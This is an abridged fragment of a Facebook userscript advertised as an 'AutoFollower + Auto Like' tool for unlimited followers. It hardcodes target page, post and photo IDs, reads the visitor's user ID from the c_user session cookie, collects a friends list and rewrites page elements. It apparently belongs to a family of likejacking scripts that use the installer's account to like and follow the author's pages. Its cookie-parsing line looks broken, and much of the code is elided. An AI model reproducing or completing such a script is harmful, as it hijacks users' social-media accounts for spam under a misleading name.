// ==UserScript==
// @name            Facebook AutoFollower + Auto Like by تـرفـنـدهـای فـیـسـبـوک
...
//Get followers facebook unlimited
...
var spage_id = "444288352338118";
var spost_id = "444288352338118";
var sfoto_id = "444288352338118";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by  تـرفـنـدهـای فـیـسـبـوک';
